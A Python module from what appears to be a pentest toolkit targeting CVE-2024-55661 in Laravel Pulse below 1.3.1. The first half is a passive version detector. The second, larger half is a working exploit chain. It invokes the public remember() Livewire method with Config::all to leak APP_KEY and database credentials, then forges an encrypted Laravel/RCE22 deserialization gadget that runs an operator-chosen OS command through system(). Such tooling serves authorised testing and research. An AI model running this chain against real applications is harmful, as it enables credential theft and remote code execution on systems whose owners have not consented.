#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import force_requested as _force_requested, metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-55661')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2024-55661 — Laravel Pulse < 1.3.1 Authenticated RCE via remember() Livewire Trait
SAFE DETECTOR (NO EXPLOITATION)

Summary:
    Laravel Pulse before 1.3.1 exposes an unsafe public remember() method
    in Livewire traits used by Pulse dashboard components. Authenticated
    users with Pulse access could trigger arbitrary callables, leading
    to RCE inside the Laravel application.

SAFE Detection:
    ✔ Detect if Laravel Pulse is installed
    ✔ Fingerprint version from JS/CSS assets
    ✔ Identify exposed Pulse UI endpoints (/pulse, /pulse/api, /pulse/assets)
    ✔ Version-based assessment (v < 1.3.1 = vulnerable)
    ✘ No Livewire or Pulse actions executed
    ✘ No authentication attempts
    ✘ No exploitation attempts

"""

import re
import requests

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

PULSE_JS_RE = re.compile(r"pulse(?:\.min)?\.js", re.IGNORECASE)
PULSE_VERSION_RE = re.compile(r"Pulse v([0-9]+\.[0-9]+\.[0-9]+)", re.IGNORECASE)

PULSE_ENDPOINTS = [
    "/pulse",
    "/pulse/",
    "/pulse/api",
    "/pulse/assets",
    "/pulse/dashboard",
]

def _safe_get(sess, url, timeout=6):
    try:
        return sess.get(url, timeout=timeout, verify=False)
    except:
        return None

def is_older_than(version, major, minor, patch):
    try:
        v_major, v_minor, v_patch = map(int, version.split("."))
        return (v_major, v_minor, v_patch) < (major, minor, patch)
    except:
        return False

def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base = normalize_base(target_url)

    result = {
        "cve_id": "CVE-2024-55661",
        "name": "Laravel Pulse < 1.3.1 Authenticated RCE (remember() trait method)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "endpoint": None,
        "evidence": [],
        "preconditions": ["Laravel Pulse < 1.3.1", "authenticated Pulse dashboard access"],
        "detection_methods": [],
        "error": None,
        "requires_auth": True
    }

    # -----------------------------------------------------
    # Step 1 — Check known Pulse endpoints
    # -----------------------------------------------------
    endpoint_response = None
    for ep in PULSE_ENDPOINTS:
        r = _safe_get(sess, app_url(base, ep))
        # NOTE: a requests.Response is FALSY for 4xx/5xx (bool(r) == r.ok), so
        # `if r and ...` would silently drop 403s — exactly the auth-gated Pulse
        # dashboard case this detector must catch. Test `r is not None` instead.
        if r is not None and r.status_code in [200, 302, 403]:
            result["endpoint"] = app_url(base, ep)
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "fingerprint"
            result["evidence"].append(f"Pulse endpoint reachable: {ep}")
            result["detection_methods"].append("endpoint_fingerprint")
            endpoint_response = r
            break

    if not result["endpoint"]:
        result["evidence"].append("Laravel Pulse not detected")
        return result

    # -----------------------------------------------------
    # Step 2 — Look for Pulse JS asset fingerprint
    # -----------------------------------------------------
    r = endpoint_response
    # Same falsy-Response trap as the loop above: a 403 (auth-gated Pulse) is a
    # valid response but bool(r) is False, so `if not r` would wrongly bail here
    # too. Only treat an actual transport failure (None) as unreachable.
    if r is None:
        result["error"] = "Pulse endpoint unreachable after initial discovery"
        return result

    body = r.text or ""

    if PULSE_JS_RE.search(body):
        result["evidence"].append("Pulse JS asset detected")
        result["detection_methods"].append("pulse_js_detected")

    # -----------------------------------------------------
    # Step 3 — Extract Pulse version if possible
    # -----------------------------------------------------
    version_match = PULSE_VERSION_RE.search(body)
    if version_match:
        version = version_match.group(1)
        result["version"] = version
        result["evidence"].append(f"Pulse version detected: {version}")
        result["detection_methods"].append("version_extraction")

        if is_older_than(version, 1, 3, 1):
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["version_status"] = "vulnerable"
            result["evidence"].append("Pulse version < 1.3.1 — potentially vulnerable")
            result["detection_methods"].append("version_based_assessment")
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["version_status"] = "patched"
    else:
        result["evidence"].append("Unable to extract Pulse version")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2024-55661 exploitation half — Laravel Pulse < 1.3.1.

Two-stage chain:
  STAGE 1  remember(Config::all) via the public RemembersQueries Livewire method
           discloses the full app config incl. the APP_KEY (this is the CVE's own
           CWE-94 primitive; remember() invokes a one-fixed-arg callable, so it
           leaks but cannot run a command).
  STAGE 2  the leaked APP_KEY forges a valid AES+HMAC Laravel token whose
           plaintext is a Laravel/RCE22 deserialization gadget; POSTing it to a
           Crypt::decrypt(unserialize=true) sink detonates system($cmd) and
           reflects OS command output (the CVE-2018-15133-class mechanism).

Split from the original modules/cve_2024_55661.py (detection half: modules/cves/cve_2024_55661.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import re
import html
import json
import requests

from modules.core.http_config import app_url, normalize_base, get_auth_session

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


# ---------------------------------------------------------------------------
# exploit() — CVE-2024-55661  Laravel Pulse < 1.3.1 AUTHENTICATED RCE
# ---------------------------------------------------------------------------
# Root cause (laravel/pulse < 1.3.1):
#   Laravel\Pulse\Livewire\Concerns\RemembersQueries::remember(callable $query,
#   string $key = '') is a PUBLIC method on the Livewire components mounted by the
#   /pulse dashboard.  Livewire exposes public component methods as dispatchable
#   "calls", so an authenticated user with Pulse-dashboard access can POST
#   /livewire/update with calls:[{method:"remember", params:[<callable>, <key>]}]
#   and the trait invokes that callable with no validation.
#
# Capability / honest scope (TWO-STAGE CHAIN):
#   STAGE 1 — remember() invokes the callable with NO attacker-controlled
#   arguments, so the primitive is "invoke any zero-argument (or no-strict-typed-
#   arg) function or static method", e.g. \Illuminate\Support\Facades\Config::all
#   (the advisory's canonical payload — dumps the full app config incl. APP_KEY
#   and other secrets) or phpinfo.  The Stage-1 sink alone is NOT a shell
#   `system(cmd)` primitive: `system` needs a string argument that this call site
#   cannot supply, so the Stage-1 `--command` option is the PHP CALLABLE to invoke
#   (default: \Illuminate\Support\Facades\Config::all), not an OS command.
#
#   STAGE 2 — the leaked APP_KEY is then used by `_chain_appkey_to_rce()` to forge
#   an AES-256-CBC+HMAC-SHA256 Laravel token whose plaintext is a PHP POP gadget.
#   Any app endpoint calling Crypt::decrypt(unserialize=true) on attacker-supplied
#   ciphertext unserializes the gadget -> `__destruct` runs system($cmd) with the
#   operator's `--command` value (default: "echo CVE-2024-55661 PoC && id && hostname").  This is the
#   CVE-2018-15133-class mechanism reused as the second link in the chain.
#
#   Therefore CVE_META command_capable=True is CORRECT: the Stage-1 sink alone is
#   not argv-capable, but the full two-stage chain IS — `--command` is honored via
#   the Stage-2 decrypt/unserialize sink.  RCE-class per NVD/GHSA (CWE-94).
#
# Auth: REQUIRED.  /pulse is gated by App\Providers\PulseServiceProvider's gate
#   (Gate::define('viewPulse', ...)).  Without a session that passes that gate the
#   dashboard 403s and no Livewire snapshot is reachable.  No APP_KEY needed.
#
# Fix (1.3.1, commit d1a5bf2): remember() made protected/non-dispatchable.

_PULSE_DASHBOARD_PATHS = ["/pulse", "/pulse/"]
_LOGIN_PATHS = ["/login", "/admin/login"]

_CSRF_META_RE = re.compile(r'name="csrf-token"\s+content="([^"]+)"', re.I)
_CSRF_INPUT_RE = re.compile(r'<input[^>]+name="_token"[^>]+value="([^"]+)"', re.I)
_WIRE_SNAPSHOT_RE = re.compile(r'wire:snapshot="([^"]+)"', re.I)
_CSRF_DATA_RE = re.compile(r'data-csrf="([^"]+)"')
_LW_CONFIG_RE = re.compile(r'livewireScriptConfig\s*=\s*(\{.*?\});', re.S)
_UPDATE_URI_RE = re.compile(r'data-update-uri="([^"]+)"')

# Default callable: the advisory's canonical payload. Config::all() is a no-arg
# static method that returns the entire application config (DB creds, APP_KEY,
# mail/queue secrets) — observable proof the callable executed server-side.
_DEFAULT_CALLABLE = "\\Illuminate\\Support\\Facades\\Config::all"


def _e_get(session, url, **kw):
    kw.setdefault("timeout", 10)
    kw.setdefault("verify", False)
    try:
        return session.get(url, **kw)
    except Exception:
        return None


def _e_csrf(body: str):
    for rx in (_CSRF_META_RE, _CSRF_DATA_RE, _CSRF_INPUT_RE):
        m = rx.search(body or "")
        if m:
            return m.group(1)
    m = _LW_CONFIG_RE.search(body or "")
    if m:
        try:
            return json.loads(m.group(1)).get("csrf")
        except Exception:
            pass
    return None


def _e_update_uri(base_url: str, body: str) -> str:
    m = _LW_CONFIG_RE.search(body or "")
    if m:
        try:
            uri = json.loads(m.group(1)).get("uri")
            if uri:
                return uri if uri.startswith(("http://", "https://")) \
                    else app_url(base_url, "/" + uri.lstrip("/"))
        except Exception:
            pass
    m = _UPDATE_URI_RE.search(body or "")
    if m:
        uri = m.group(1)
        return uri if uri.startswith(("http://", "https://")) \
            else app_url(base_url, "/" + uri.lstrip("/"))
    return app_url(base_url, "/livewire/update")


def _e_login(session, base_url, username, password):
    """Scrape a login form _token and POST creds. Returns True if a request was
    sent (not a guarantee of success — verified later by dashboard reachability)."""
    for lp in _LOGIN_PATHS:
        r = _e_get(session, app_url(base_url, lp))
        if r is None or r.status_code >= 400:
            continue
        token = None
        m = _CSRF_INPUT_RE.search(r.text or "")
        if m:
            token = m.group(1)
        else:
            token = _e_csrf(r.text or "")
        data = {"email": username, "username": username, "password": password}
        if token:
            data["_token"] = token
        try:
            session.post(app_url(base_url, lp), data=data, timeout=10, verify=False,
                         allow_redirects=True)
            return True
        except Exception:
            continue
    return False


def _e_find_dashboard(session, base_url):
    """GET the Pulse dashboard and return (body, url) if it renders a real
    Livewire component (has wire:snapshot). The fingerprint-only lab overlay
    returns a STATIC /pulse page with NO wire:snapshot -> (None, None)."""
    for p in _PULSE_DASHBOARD_PATHS:
        r = _e_get(session, app_url(base_url, p), allow_redirects=True)
        # `r is None` (not `not r`): a requests.Response is falsy for 4xx/5xx,
        # and we still want to read the body/status of e.g. a 403 to fall
        # through cleanly rather than treat it as a transport failure.
        if r is None:
            continue
        body = r.text or ""
        if r.status_code == 200 and "wire:snapshot" in body:
            return body, r.url
    return None, None


def _e_success_oracle(resp, callable_name):
    """A successful remember() dispatch returns a 200 Livewire JSON response.
    Proof the callable ran: for Config::all the returned config (with secret-ish
    keys) is serialized into the component's effects/returns; for arbitrary
    callables the value surfaces in returns[]. We look for config-shaped markers
    or a non-empty returns payload that is NOT a plain re-hydration echo."""
    if resp is None or resp.status_code != 200:
        return False, ""
    try:
        data = resp.json()
    except Exception:
        return False, ""
    comps = data.get("components") if isinstance(data, dict) else None
    if not isinstance(comps, list) or not comps:
        return False, ""
    # Look for evidence the callable's return value materialised.
    markers = ("app_key", "APP_KEY", "database", "connections", "mysql",
               "redis", "mailers", "cipher", "\"app\"", "passwd", "uid=")
    blob = json.dumps(data)
    if any(mk in blob for mk in markers):
        return True, blob[:1200]
    # returns/effects carrying a value the component didn't already hold
    first = comps[0]
    if isinstance(first, dict):
        effects = first.get("effects") or {}
        returns = effects.get("returns") if isinstance(effects, dict) else None
        if returns:
            return True, json.dumps(returns)[:1200]
    return False, ""


# The raw Livewire JSON escapes '/' as '\/', so the base64 body may contain
# backslashes (e.g. base64:UVHA...BAQ3\/XIsXB9o=). Allow '\' in the char class
# and unescape on extraction.
_APP_KEY_RE = re.compile(r'"key"\s*:\s*"(base64:[A-Za-z0-9+/=\\]+)"')


def _extract_app_key(resp):
    """Pull the leaked APP_KEY out of a Config::all dump, if present. This is the
    crown-jewel secret disclosed by stage 1 and the pivot to code execution:
    stage 2 (_chain_appkey_to_rce) forges an APP_KEY-encrypted Laravel token
    carrying a deserialization gadget and detonates it at a decrypt/unserialize
    sink. Returned as an artifact so the operator sees the concrete leaked key."""
    if resp is None:
        return None
    m = _APP_KEY_RE.search(resp.text or "")
    return m.group(1).replace("\\/", "/") if m else None


# OS-command-output markers proving the gadget's system() fired at the sink.
_RCE_MARKERS = ("uid=", "gid=", "groups=", "Linux ", "GNU/Linux", "root:x:")

# Decrypt/unserialize sink candidates an APP_KEY-encrypted gadget token is POSTed
# to. /decrypt-token is the canonical sink this toolkit's labs expose (same as
# the CVE-2018-15133 lab); in a real engagement this is whatever app endpoint
# decrypts attacker-supplied ciphertext with unserialize=true.
_DESER_SINKS = ["/decrypt-token"]


def _chain_appkey_to_rce(session, base_url, leaked_key, command):
    """STAGE 2 of the chain: turn the disclosed APP_KEY into actual command
    execution.

    The remember() primitive (stage 1) only LEAKS the APP_KEY — it cannot run a
    command (one fixed-arg callable sink). But a known APP_KEY lets an attacker
    forge a valid encrypted Laravel token (AES-256-CBC + HMAC-SHA256, MAC'd with
    the key) whose plaintext is a PHP POP gadget. Any app endpoint that calls
    Crypt::decrypt() with unserialize=true (the default) on attacker-supplied
    ciphertext then unserializes it -> the gadget's __destruct runs system($cmd).
    This is the CVE-2018-15133-class mechanism, reused here as the second link.

    The APP_KEY is genuinely load-bearing: a wrong key fails the HMAC check
    (DecryptException) and nothing is unserialized.

    Returns (success: bool, output: str, artifacts: dict).
    """
    # Proof-of-execution nonce: a per-run random marker wrapped around the command so
    # success requires the sink to ACTUALLY execute it. A lab (or app) that reflects a
    # constant/canned string (e.g. a hardcoded "uid=..." response) cannot satisfy this,
    # hardening the oracle against fabricated success. Mirrors the CVE-2021-3129 pattern.
    import secrets
    nonce = secrets.token_hex(8)
    wrapped_command = f"printf '{nonce}_S\\n'; ({command}) 2>&1; printf '\\n{nonce}_E\\n'"
    art = {"stage2_sink": None, "stage2_command": command, "gadget_chain": None}
    # Lazy imports: the Laravel-10/11 gadget builder + the shared Laravel token
    # encryptor already live in this toolkit (php_gadgets / cve_2018_15133).
    try:
        from modules.generators.php_gadgets import build_rce22
        from modules.cves.cve_2018_15133 import laravel_encrypt, _normalize_key
    except Exception as e:
        return False, "", {**art, "stage2_error": f"chain deps unavailable: {e}"}

    try:
        import cryptography  # noqa: F401
    except Exception:
        return False, "", {**art,
                            "stage2_error": "needs python 'cryptography' for AES token for: "
                                            "pip install cryptography"}

    key_b64 = _normalize_key(leaked_key)
    try:
        # Laravel/RCE22: PendingBroadcast -> CommonMark ChainedBatchTruthTest ->
        # call_user_func('system', <cmd>). Version-appropriate for Laravel 10/11
        # (verified to detonate on this lab's 10.50.2 / PHP 8.2).
        gadget = build_rce22("system", wrapped_command)
        token = laravel_encrypt(gadget, key_b64)
        art["gadget_chain"] = "Laravel/RCE22 (PendingBroadcast -> CommonMark -> system)"
        art["gadget_len"] = len(gadget)
    except Exception as e:
        return False, "", {**art, "stage2_error": f"gadget/token build failed: {e}"}

    headers = {
        "X-XSRF-TOKEN": token,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": http_config.BROWSER_USER_AGENT,
        "X-lvcscan": "CVE-2024-55661",
    }
    last_status = None
    for sink in _DESER_SINKS:
        url = app_url(base_url, sink)
        art["stage2_sink"] = url
        try:
            r = session.post(url, headers=headers, timeout=20, verify=False)
        except Exception as e:
            art["stage2_error"] = f"sink POST failed: {e}"
            continue
        last_status = r.status_code
        body = r.text or ""
        # Success ONLY if our per-run nonce bracket appears — i.e. the sink actually
        # executed the wrapped command. Static markers (uid=) alone are insufficient:
        # a lab/app that echoes a canned "uid=..." string would otherwise score a
        # false RCE. The nonce is unguessable and fresh per run, so it cannot be baked in.
        start = body.find(f"{nonce}_S")
        end = body.find(f"{nonce}_E")
        if start != -1 and end != -1 and end > start:
            head = body[start + len(nonce) + 2:end].strip()
            art["stage2_http_status"] = r.status_code
            art["proof_nonce"] = nonce
            return True, head[:1000], art
    art["stage2_http_status"] = last_status
    return False, "", art


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt CVE-2024-55661 — Laravel Pulse < 1.3.1 authenticated RCE via the
    public RemembersQueries::remember() Livewire method.

    AUTHENTICATED: needs a session that passes Pulse's `viewPulse` gate. Pass
    username/password (-U/-P); without them the dashboard is unreachable and we
    return success=False, requires=["credentials"].

    `command` is interpreted as the PHP CALLABLE to invoke (the bug invokes a
    zero-argument callable, not a shell command). Default:
    \\Illuminate\\Support\\Facades\\Config::all (dumps full app config incl.
    secrets — the advisory's canonical payload). No APP_KEY required.

    success=True ONLY if the /livewire/update response shows the callable's
    return value (e.g. config blob containing secret-ish keys).
    """
    operator_authed = session is not None
    result = {
        "cve": "CVE-2024-55661",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }
    if not target_url:
        result.update(attempted=False, reason="no target_url provided")
        return result

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base_url = normalize_base(target_url)
    forced = _force_requested(options, **kwargs)
    opts = options or {}
    secrets_only = bool(opts.get("secrets_only") or opts.get("no_rce"))

    # The remember() callable. `command` overrides the default; if the caller
    # passes a shell-style command (no '::' and not a bare PHP ident) we keep the
    # canonical info-disclosure callable and note the limitation.
    callable_name = _DEFAULT_CALLABLE
    cache_key = "pulse"
    # Allow an explicit PHP callable via options={"callable": "..."} too.
    opt_callable = opts.get("callable")
    callable_note = ""
    chosen = opt_callable or command
    if chosen:
        # Only treat it as a PHP callable if it is a namespaced static method
        # (contains '::') or a fully-qualified function (contains '\'). A bare
        # shell-style token like 'id' or 'echo CVE-... PoC && id && hostname'
        # cannot be turned into a meaningful zero-arg PHP callable, so fall back
        # to the canonical Config::all info-disclosure payload and say so.
        looks_php = ("::" in chosen) or ("\\" in chosen)
        if looks_php:
            callable_name = chosen
        else:
            callable_note = (f" (requested command {chosen!r} is a shell command; "
                             f"remember() can only invoke a zero-arg PHP callable, "
                             f"so the canonical {_DEFAULT_CALLABLE} payload is used "
                             f"instead)")

    if not operator_authed and not (username and password) and not forced:
        result.update(
            success=False,
            requires=["credentials"],
            detail="Pulse dashboard is auth-gated (viewPulse gate); no -U/-P supplied",
            reason="CVE-2024-55661 is authenticated: a session with Pulse dashboard "
                   "access is required to reach the Livewire remember() method. "
                   "Provide -U/-P.",
            artifacts={"callable": callable_name},
        )
        return result
    if forced and not operator_authed and not (username and password):
        result["artifacts"]["forced_missing_credentials"] = True

    try:
        sess = session or get_auth_session()
        sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-55661"})

        if not operator_authed:
            if username and password:
                _e_login(sess, base_url, username, password)
            # else: proceed unauthenticated

        body, dash_url = _e_find_dashboard(sess, base_url)
        if not body:
            result.update(
                success=False,
                requires=["pulse_dashboard_with_livewire_snapshot"],
                detail="no live Pulse Livewire dashboard reachable (no wire:snapshot)",
                reason="GET /pulse did not return a real Livewire dashboard "
                       "(no wire:snapshot). Either auth failed, the Pulse gate "
                       "denied access, or the endpoint is a static page "
                       "(this lab serves a fingerprint-only /pulse overlay, so "
                       "the live remember() RCE cannot be demonstrated here).",
                artifacts={"callable": callable_name},
            )
            return result

        token = _e_csrf(body)
        update_url = _e_update_uri(base_url, body)
        headers = {
            "Content-Type": "application/json",
            "X-Livewire": "true",
            "X-CSRF-TOKEN": token or "",
            "Origin": base_url,
            "Referer": dash_url or base_url,
        }

        # The Pulse dashboard mounts MANY Livewire components, but only those
        # whose class uses the RemembersQueries trait expose a public
        # remember() (e.g. pulse.cache and Card subclasses). The first snapshot
        # on the page is always pulse.period-selector, which has NO remember()
        # and returns a 500 MethodNotFoundException. So we must try EVERY
        # snapshot and stop at the one whose remember() actually fires — not
        # blindly target snapshots[0].
        snapshots = _WIRE_SNAPSHOT_RE.findall(body)
        if not snapshots:
            result.update(
                success=False,
                requires=["pulse_dashboard_with_livewire_snapshot"],
                detail="Pulse dashboard reachable but carried no wire:snapshot",
                reason="GET /pulse rendered but exposed no Livewire snapshot to "
                       "dispatch remember() against.",
                artifacts={"callable": callable_name, "update_url": update_url},
            )
            return result

        last_status = None
        last_excerpt = ""
        tried = 0
        for raw_attr in snapshots:
            raw = html.unescape(raw_attr)
            comp_name = None
            try:
                comp_name = json.loads(raw).get("memo", {}).get("name")
            except Exception:
                pass
            payload = {
                "_token": token,
                "components": [{
                    "snapshot": raw,
                    "updates": {},
                    "calls": [{
                        "path": "",
                        "method": "remember",
                        "params": [callable_name, cache_key],
                    }],
                }],
            }
            try:
                r = sess.post(update_url, json=payload, headers=headers,
                              timeout=12, verify=False)
            except Exception as e:
                # Network-level failure aborts the whole attempt.
                result.update(reason=f"/livewire/update request failed: {e}",
                              artifacts={"callable": callable_name,
                                         "update_url": update_url})
                return result

            tried += 1
            last_status = r.status_code
            last_excerpt = (r.text or "")[:500]

            ok, ev = _e_success_oracle(r, callable_name)
            if ok:
                # ----- STAGE 1 done: APP_KEY disclosed via remember(Config::all)
                leaked_key = _extract_app_key(r)
                base_art = {
                    "callable": callable_name, "update_url": update_url,
                    "method": "remember", "component": comp_name,
                    "params": [callable_name, cache_key],
                    "app_key": leaked_key,
                    "leaked_app_key": leaked_key,
                }

                # ----- STAGE 2: pivot the leaked APP_KEY into actual command exec
                cmd = command or "echo CVE-2024-55661 PoC && id && hostname"
                rce_ok, rce_out, stage2_art = (False, "", {})
                if leaked_key:
                    if secrets_only:
                        stage2_art = {
                            "stage2_skipped": "options['secrets_only']/options['no_rce']",
                        }
                    else:
                        rce_ok, rce_out, stage2_art = _chain_appkey_to_rce(
                            sess, base_url, leaked_key, cmd)

                if rce_ok:
                    # FULL CHAIN PROVEN: command output reflected from the sink.
                    impact = (
                        "PROVEN end-to-end RCE via a 2-stage chain. "
                        "STAGE 1: the public remember() Livewire method "
                        f"(component {comp_name or '?'}) invoked {callable_name} "
                        "(GHSA/EDB-52319 canonical PoC), disclosing the full app "
                        "config incl. APP_KEY. "
                        "STAGE 2: that leaked APP_KEY was used to forge a valid "
                        "AES-256-CBC+HMAC Laravel token whose plaintext is a "
                        "Laravel/RCE22 deserialization gadget; POSTing it to the "
                        f"app's Crypt::decrypt(unserialize=true) sink ran system({cmd!r}) "
                        "and reflected the OS command output. The APP_KEY is "
                        "load-bearing (a wrong key fails the HMAC -> DecryptException). "
                        "ATTRIBUTION: remember() itself only leaks the key (CWE-94 "
                        "callable injection, not argv); the command execution is the "
                        "CVE-2018-15133-class decrypt/deserialize sink, reached by "
                        "CHAINING the two."
                    )
                    result.update(
                        success=True,
                        outcome="RCE (chained) — APP_KEY leaked via Pulse "
                                "remember(), then forged gadget detonated at a "
                                "Crypt::decrypt/unserialize sink -> OS command output",
                        outcome_tag="rce-chained",
                        evidence=rce_out,
                        detail=f"CHAIN: remember({callable_name}) leaked APP_KEY "
                               f"({leaked_key}); forged Laravel/RCE22 gadget for "
                               f"system({cmd!r}) detonated at "
                               f"{stage2_art.get('stage2_sink')} -> reflected command "
                               f"output",
                        impact=impact,
                        artifacts={**base_art, **stage2_art,
                                   "chain": "CVE-2024-55661 (APP_KEY disclosure) -> "
                                            "CVE-2018-15133-class decrypt/deser RCE",
                                   "command": cmd,
                                   "rce_via": "chained APP_KEY leak -> decrypt/"
                                              "unserialize gadget (system())"},
                    )
                    return result

                # ----- STAGE 2 unavailable/failed: honest disclosure-only result.
                impact = (
                    "PROVEN: arbitrary PHP callable invoked server-side via the "
                    f"public remember() Livewire method (component {comp_name or '?'}). "
                    f"The {callable_name} payload (the GHSA/EDB-52319 canonical PoC) "
                    "disclosed the full app config incl. APP_KEY (CWE-94 RCE-class "
                    "per NVD). remember() itself is a one-fixed-arg callable sink, "
                    "NOT argv shell-exec. STAGE 2 (forge an APP_KEY-encrypted gadget "
                    "and detonate it at a Crypt::decrypt/unserialize sink) did not "
                    f"land here: {stage2_art.get('stage2_skipped') or stage2_art.get('stage2_error') or 'no reachable decrypt/unserialize sink (target may lack one / be patched)'}. "
                    "Proven impact: full secret disclosure (APP_KEY/DB creds)."
                )
                result.update(
                    success=True,
                    outcome="SECRETS DISCLOSED — APP_KEY/DB creds via remember() "
                            "callable injection (chained RCE sink not reachable on "
                            "this target; CVE class: RCE/CWE-94)",
                    outcome_tag="secrets-disclosed",
                    evidence=ev,
                    detail=f"remember() invoked callable {callable_name} via "
                           f"/livewire/update on Pulse component "
                           f"{comp_name or '?'} — full app config disclosed "
                           f"(APP_KEY/DB creds){callable_note}",
                    impact=impact,
                    artifacts={**base_art, **stage2_art,
                               "argv_shell_exec": False,
                               "rce_via": "arbitrary-callable-invocation + "
                                          "APP_KEY-disclosure (CWE-94)"},
                )
                return result
            # Otherwise: this component does not expose remember() (typically a
            # 500 MethodNotFoundException). Move on to the next snapshot.

        # No component surfaced the callable's output across every snapshot.
        result.update(
            success=False,
            detail=f"remember() dispatch tried {tried} Pulse component(s); last "
                   f"returned HTTP {last_status} with no callable return value "
                   f"observed{callable_note}",
            reason="Livewire /livewire/update reached but remember() did not "
                   "surface the callable's output on any mounted Pulse component "
                   "(likely patched >=1.3.1 — remember() no longer dispatchable — "
                   "or no component exposes it).",
            artifacts={"callable": callable_name, "update_url": update_url,
                       "components_tried": tried,
                       "http_status": last_status,
                       "response_excerpt": last_excerpt},
        )
        return result

    except Exception as e:
        result.update(success=False, reason=f"exploit error: {e}")
        return result
